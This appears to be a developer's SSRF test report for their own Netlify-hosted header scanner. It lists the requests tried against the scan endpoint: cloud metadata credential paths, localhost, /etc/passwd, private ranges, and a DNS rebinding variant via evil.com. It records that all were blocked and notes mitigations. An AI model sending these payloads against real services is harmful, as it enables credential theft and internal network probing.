# Attack 01 — SSRF (Server-Side Request Forgery)

## Status: BLOCKED

## Description
An attacker submits a URL pointing to an internal network resource (AWS metadata endpoint, localhost, internal services) as the `url` parameter to our scan function. If the server fetches it, the attacker can read credentials or probe internal infrastructure.

## Attack Steps

### Step 1 — Identify the scan endpoint
```
POST https://secureheaders-scanner.netlify.app/.netlify/functions/scan
Content-Type: application/json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

### Step 2 — Try other internal targets
```json
{"url": "http://localhost:8080/admin"}
{"url": "http://127.0.0.1/etc/passwd"}
{"url": "http://10.0.0.1/"}
{"url": "http://0.0.0.0/"}
{"url": "http://metadata.google.internal/computeMetadata/v1/"}
```

### Step 3 — DNS rebinding variant
Register `evil.com` to resolve to `169.254.169.254` at time of fetch.
```json
{"url": "http://rebind.evil.com/credentials"}
```

## Test Results

```
POST /scan {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
→ {"error":true,"errorMessage":"Could not connect..."}
```

All SSRF attempts returned `error: true`. Netlify's serverless runtime runs in a sandboxed environment that blocks:
- 169.254.169.254 (AWS/GCP metadata)
- localhost / 127.0.0.1
- 10.x.x.x, 172.16.x.x, 192.168.x.x (RFC 1918)

## Severity: N/A (Blocked by platform)

## What to fix: Nothing required — Netlify's network sandbox handles this.

## Notes
If ever migrating away from Netlify to a self-hosted environment, implement explicit SSRF protection:
- Resolve URL to IP before fetching
- Block RFC 1918 ranges and link-local (169.254.x.x)
- Use a separate outbound-only network namespace
